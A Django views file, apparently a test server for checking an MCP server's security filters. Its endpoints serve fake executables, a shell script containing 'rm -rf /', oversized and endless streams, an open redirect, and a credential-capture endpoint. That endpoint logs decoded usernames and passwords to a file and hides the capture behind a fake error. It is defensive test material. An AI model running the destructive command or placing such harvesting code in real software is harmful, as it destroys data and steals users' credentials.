"""
Views para probar las funcionalidades de seguridad del servidor MCP.
Estos endpoints simulan diferentes escenarios maliciosos y seguros.
"""
import json
import time
import base64
import os
from datetime import datetime
from django.http import JsonResponse, HttpResponse, StreamingHttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods


# ============================================================================
# ENDPOINTS SEGUROS (Para verificar funcionalidad básica)
# ============================================================================

@csrf_exempt
@require_http_methods(["GET", "POST"])
def test_safe_json(request):
    """Endpoint seguro con respuesta JSON normal."""
    return JsonResponse({
        "status": "ok",
        "message": "Este endpoint es seguro",
        "timestamp": time.time(),
        "method": request.method,
        "content_type": "application/json"
    })


@csrf_exempt
@require_http_methods(["GET"])
def test_safe_html(request):
    """Endpoint seguro con respuesta HTML."""
    html = """
    <!DOCTYPE html>
    <html>
    <head><title>Test Safe HTML</title></head>
    <body>
        <h1>Endpoint Seguro</h1>
        <p>Este contenido es seguro para el servidor MCP.</p>
    </body>
    </html>
    """
    return HttpResponse(html, content_type="text/html")


@csrf_exempt
@require_http_methods(["GET"])
def test_safe_xml(request):
    """Endpoint seguro con respuesta XML."""
    xml = """<?xml version="1.0" encoding="UTF-8"?>
    <response>
        <status>ok</status>
        <message>Este endpoint es seguro</message>
        <timestamp>{}</timestamp>
    </response>
    """.format(time.time())
    return HttpResponse(xml, content_type="application/xml")


@csrf_exempt
@require_http_methods(["GET"])
def test_safe_text(request):
    """Endpoint seguro con respuesta de texto plano."""
    return HttpResponse(
        "Este es un endpoint seguro con texto plano.\nTimestamp: {}".format(time.time()),
        content_type="text/plain"
    )


# ============================================================================
# ENDPOINTS DE AUTENTICACIÓN (Para probar credenciales)
# ============================================================================

@csrf_exempt
@require_http_methods(["GET", "POST"])
def test_basic_auth(request):
    """Endpoint que requiere autenticación básica."""
    auth_header = request.META.get('HTTP_AUTHORIZATION', '')
    
    if not auth_header.startswith('Basic '):
        return JsonResponse({
            "error": "Autenticación requerida"
        }, status=401, headers={'WWW-Authenticate': 'Basic realm="Test Realm"'})
    
    try:
        encoded = auth_header.split(' ', 1)[1]
        decoded = base64.b64decode(encoded).decode('utf-8')
        username, password = decoded.split(':', 1)
        
        # Validación simple (para testing)
        if username == "testuser" and password == "testpass":
            return JsonResponse({
                "status": "authenticated",
                "username": username,
                "message": "Autenticación exitosa"
            })
        else:
            return JsonResponse({
                "error": "Credenciales inválidas"
            }, status=401)
    except Exception as e:
        return JsonResponse({
            "error": f"Error al procesar autenticación: {str(e)}"
        }, status=400)


@csrf_exempt
@require_http_methods(["GET", "POST"])
def test_bearer_token(request):
    """Endpoint que requiere Bearer Token."""
    auth_header = request.META.get('HTTP_AUTHORIZATION', '')
    
    if not auth_header.startswith('Bearer '):
        return JsonResponse({
            "error": "Bearer Token requerido"
        }, status=401)
    
    token = auth_header.split(' ', 1)[1]
    
    # Validación simple (para testing)
    if token == "valid_token_12345":
        return JsonResponse({
            "status": "authenticated",
            "message": "Token válido",
            "token_preview": token[:10] + "..."
        })
    else:
        return JsonResponse({
            "error": "Token inválido"
        }, status=401)


# ============================================================================
# ENDPOINTS MALICIOSOS - MALWARE (Debe ser bloqueado por MCP)
# ============================================================================

@csrf_exempt
@require_http_methods(["GET"])
def test_malware_executable(request):
    """Simula descarga de archivo ejecutable (Content-Type peligroso)."""
    # Magic bytes de un archivo .exe
    fake_exe = b"\x4d\x5a\x90\x00\x03\x00\x00\x00"
    
    response = HttpResponse(fake_exe, content_type="application/x-executable")
    response['Content-Disposition'] = 'attachment; filename="malware.exe"'
    return response


@csrf_exempt
@require_http_methods(["GET"])
def test_malware_shellscript(request):
    """Simula descarga de script malicioso."""
    script = "#!/bin/bash\nrm -rf /\necho 'Malicious payload'"
    
    return HttpResponse(
        script,
        content_type="application/x-shellscript",
        headers={'Content-Disposition': 'attachment; filename="malware.sh"'}
    )


@csrf_exempt
@require_http_methods(["GET"])
def test_malware_zip(request):
    """Simula descarga de archivo comprimido (bloqueado por seguridad)."""
    # Magic bytes de un archivo ZIP
    fake_zip = b"PK\x03\x04\x14\x00\x00\x00"
    
    response = HttpResponse(fake_zip, content_type="application/zip")
    response['Content-Disposition'] = 'attachment; filename="archive.zip"'
    return response


@csrf_exempt
@require_http_methods(["GET"])
def test_malware_dll(request):
    """Simula descarga de DLL maliciosa."""
    # Magic bytes de un archivo DLL (similar a EXE)
    fake_dll = b"\x4d\x5a\x90\x00"
    
    response = HttpResponse(fake_dll, content_type="application/x-msdownload")
    response['Content-Disposition'] = 'attachment; filename="malware.dll"'
    return response


@csrf_exempt
@require_http_methods(["GET"])
def test_malware_octet_stream(request):
    """Simula descarga de binario genérico (sospechoso)."""
    fake_binary = b"\x00\x01\x02\x03\x04\x05\x06\x07"
    
    response = HttpResponse(fake_binary, content_type="application/octet-stream")
    response['Content-Disposition'] = 'attachment; filename="binary.bin"'
    return response


# ============================================================================
# ENDPOINTS DE DOS (Debe ser bloqueado por límites de MCP)
# ============================================================================

@csrf_exempt
@require_http_methods(["GET"])
def test_dos_large_response(request):
    """Simula respuesta muy grande (DoS - excede 10MB)."""
    size_mb = int(request.GET.get('size', 50))  # Default 50MB
    
    # Generar 1MB a la vez para no consumir toda la memoria
    def generate_large_data():
        chunk_size = 1024 * 1024  # 1MB
        for _ in range(size_mb):
            yield b'X' * chunk_size
    
    response = StreamingHttpResponse(
        generate_large_data(),
        content_type='text/plain'
    )
    response['Content-Length'] = size_mb * 1024 * 1024
    return response


@csrf_exempt
@require_http_methods(["GET"])
def test_dos_slow_response(request):
    """Simula respuesta muy lenta (Slowloris - excede 30s)."""
    delay = int(request.GET.get('delay', 35))  # Default 35 segundos
    
    time.sleep(delay)
    
    return JsonResponse({
        "status": "ok",
        "message": f"Respuesta después de {delay} segundos",
        "timestamp": time.time()
    })


@csrf_exempt
@require_http_methods(["GET"])
def test_dos_fast_anomaly(request):
    """Responde instantáneamente (anomalía - demasiado rápido)."""
    # Esta respuesta es pre-generada y responde en <1ms
    return JsonResponse({
        "timestamp": time.time(),
        "cached": True
    })


def generate_streaming_data():
    """Generador para simular respuesta que nunca termina."""
    while True:
        yield b'X' * 1024
        time.sleep(0.1)


@csrf_exempt
@require_http_methods(["GET"])
def test_dos_infinite_stream(request):
    """Simula stream infinito (nunca termina)."""
    return StreamingHttpResponse(
        generate_streaming_data(),
        content_type='text/plain'
    )


# ============================================================================
# ENDPOINTS DE CONTENT-TYPE NO PERMITIDO
# ============================================================================

@csrf_exempt
@require_http_methods(["GET"])
def test_disallowed_pdf(request):
    """Content-Type PDF no está en la lista de permitidos."""
    fake_pdf = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3"
    
    response = HttpResponse(fake_pdf, content_type="application/pdf")
    response['Content-Disposition'] = 'attachment; filename="document.pdf"'
    return response


@csrf_exempt
@require_http_methods(["GET"])
def test_disallowed_word(request):
    """Content-Type de documento Word no permitido."""
    fake_doc = b"PK\x03\x04"  # DOCX es básicamente un ZIP
    
    response = HttpResponse(
        fake_doc,
        content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    )
    response['Content-Disposition'] = 'attachment; filename="document.docx"'
    return response


@csrf_exempt
@require_http_methods(["GET"])
def test_disallowed_image(request):
    """Content-Type de imagen (debería bloquearse)."""
    # Magic bytes de PNG
    fake_png = b"\x89PNG\r\n\x1a\n"
    
    response = HttpResponse(fake_png, content_type="image/png")
    response['Content-Disposition'] = 'inline; filename="image.png"'
    return response


# ============================================================================
# ENDPOINTS DE EXTENSIONES PELIGROSAS EN URL
# ============================================================================

@csrf_exempt
@require_http_methods(["GET"])
def test_dangerous_extension_exe(request):
    """URL termina en .exe (extensión peligrosa)."""
    return JsonResponse({
        "warning": "Esta URL termina en .exe",
        "message": "Debería ser bloqueada por extensión peligrosa"
    })


@csrf_exempt
@require_http_methods(["GET"])
def test_dangerous_extension_sh(request):
    """URL termina en .sh (script shell)."""
    return JsonResponse({
        "warning": "Esta URL termina en .sh",
        "message": "Debería ser bloqueada por extensión peligrosa"
    })


@csrf_exempt
@require_http_methods(["GET"])
def test_dangerous_extension_dll(request):
    """URL termina en .dll (biblioteca dinámica)."""
    return JsonResponse({
        "warning": "Esta URL termina en .dll",
        "message": "Debería ser bloqueada por extensión peligrosa"
    })


# ============================================================================
# ENDPOINT DE CAPTURA DE CREDENCIALES (Vulnerabilidad simulada)
# ============================================================================

@csrf_exempt
@require_http_methods(["POST"])
def test_capture_credentials(request):
    """
    Endpoint malicioso que captura credenciales.
    ESTE ES EL ENDPOINT DEL ATACANTE PARA DEMOSTRAR LA VULNERABILIDAD.
    """
    try:
        # Captura credenciales de autenticación básica
        auth_header = request.META.get('HTTP_AUTHORIZATION', '')
        
        # Decodifica las credenciales si es Basic Auth
        username = None
        password = None
        if auth_header.startswith('Basic '):
            try:
                encoded_credentials = auth_header.split(' ')[1]
                decoded_credentials = base64.b64decode(encoded_credentials).decode('utf-8')
                username, password = decoded_credentials.split(':', 1)
            except:
                pass
        
        # Captura credenciales del body
        try:
            body = json.loads(request.body) if request.body else {}
        except:
            body = {}
        
        # Registra las credenciales capturadas
        captured_data = {
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "password": password,
            "auth_header": auth_header,
            "body": body,
            "headers": {
                "user-agent": request.META.get('HTTP_USER_AGENT', ''),
                "content-type": request.META.get('CONTENT_TYPE', ''),
            },
            "source_ip": request.META.get('REMOTE_ADDR'),
            "method": request.method,
        }
        
        # 📝 GUARDA LAS CREDENCIALES EN UN ARCHIVO
        log_file_path = os.path.join(
            os.path.dirname(__file__), 
            'stolen_credentials.log'
        )
        
        with open(log_file_path, 'a') as f:
            f.write("="*80 + "\n")
            f.write(f"🚨 CREDENTIAL CAPTURE - {captured_data['timestamp']}\n")
            f.write("="*80 + "\n")
            if username and password:
                f.write(f"💀 USERNAME: {username}\n")
                f.write(f"💀 PASSWORD: {password}\n")
            f.write(f"📍 IP: {captured_data['source_ip']}\n")
            f.write(f"🌐 User-Agent: {captured_data['headers']['user-agent']}\n")
            f.write(f"📦 Body: {json.dumps(body, indent=2)}\n")
            f.write("\n")
        
        # Simula un error para no levantar sospechas
        # (un atacante real haría esto para ocultar la captura)
        return JsonResponse({
            "error": "Connection refused",
            "detail": "Service temporarily unavailable",
            # Para la demo, también retornamos los datos
            "captured_data": captured_data
        }, status=200)  # Cambiado a 200 para que el MCP pueda ver la respuesta
        
    except Exception as e:
        return JsonResponse({
            "error": str(e)
        }, status=500)


@csrf_exempt
@require_http_methods(["POST"])
def clear_stolen_credentials_log(request):
    """Limpia el archivo de credenciales robadas (solo para pruebas)."""
    try:
        log_file_path = os.path.join(
            os.path.dirname(__file__), 
            'stolen_credentials.log'
        )
        
        if os.path.exists(log_file_path):
            os.remove(log_file_path)
            return JsonResponse({
                "status": "success",
                "message": "Log de credenciales limpiado"
            })
        else:
            return JsonResponse({
                "status": "success",
                "message": "El log no existe"
            })
    except Exception as e:
        return JsonResponse({
            "error": str(e)
        }, status=500)


# ============================================================================
# ENDPOINT DE HEALTH CHECK
# ============================================================================

@csrf_exempt
@require_http_methods(["GET"])
def test_health_check(request):
    """Health check endpoint con lista de todos los endpoints disponibles."""
    return JsonResponse({
        "status": "healthy",
        "server": "Django Test Server for MCP Security",
        "timestamp": time.time(),
        "endpoints": {
            "safe": [
                "/test/safe/json",
                "/test/safe/html",
                "/test/safe/xml",
                "/test/safe/text",
            ],
            "authentication": [
                "/test/auth/basic",
                "/test/auth/bearer",
            ],
            "malware": [
                "/test/malware/executable",
                "/test/malware/shellscript",
                "/test/malware/zip",
                "/test/malware/dll",
                "/test/malware/octet-stream",
            ],
            "dos": [
                "/test/dos/large-response?size=50",
                "/test/dos/slow-response?delay=35",
                "/test/dos/fast-anomaly",
                "/test/dos/infinite-stream",
            ],
            "disallowed_content_type": [
                "/test/disallowed/pdf",
                "/test/disallowed/word",
                "/test/disallowed/image",
            ],
            "dangerous_extensions": [
                "/test/dangerous/file.exe",
                "/test/dangerous/script.sh",
                "/test/dangerous/library.dll",
            ],
            "vulnerability": [
                "/test/evil/capture-credentials",
                "/test/evil/clear-log",
            ]
        }
    })


# ============================================================================
# ENDPOINTS ADICIONALES PARA PRUEBAS ESPECÍFICAS
# ============================================================================

@csrf_exempt
@require_http_methods(["GET"])
def test_safe_large_json(request):
    """Endpoint seguro con JSON grande pero dentro de límites (< 10MB)."""
    # Genera aproximadamente 5MB de datos JSON
    data = [
        {
            "id": i,
            "name": f"Item {i}",
            "description": "X" * 1000,
            "metadata": {
                "created": time.time(),
                "tags": [f"tag{j}" for j in range(10)]
            }
        }
        for i in range(1000)
    ]
    return JsonResponse(data, safe=False)


@csrf_exempt
@require_http_methods(["GET", "POST"])
def test_redirect(request):
    """Endpoint que redirige a otra URL."""
    target = request.GET.get('target', 'https://example.com')
    
    response = JsonResponse({
        "message": "Redirigiendo...",
        "target": target
    })
    response.status_code = 302
    response['Location'] = target
    return response


@csrf_exempt
@require_http_methods(["GET"])
def test_custom_headers(request):
    """Endpoint que retorna headers personalizados."""
    response = JsonResponse({
        "message": "Endpoint con headers personalizados",
        "timestamp": time.time()
    })
    response['X-Custom-Header'] = 'CustomValue'
    response['X-Server-Info'] = 'Django-MCP-Test-Server'
    return response
